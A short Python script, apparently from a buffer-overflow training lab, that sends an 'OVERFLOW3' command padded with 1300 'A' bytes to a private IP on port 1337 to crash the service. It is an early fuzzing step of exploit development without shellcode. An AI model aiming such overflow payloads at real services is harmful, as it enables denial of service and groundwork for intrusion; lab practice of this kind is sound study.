import socket, struct


host, port = '10.10.60.7', 1337

command = b'OVERFLOW3 '




payload = b''.join([

command,
b'A' * 1300,




])




with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)
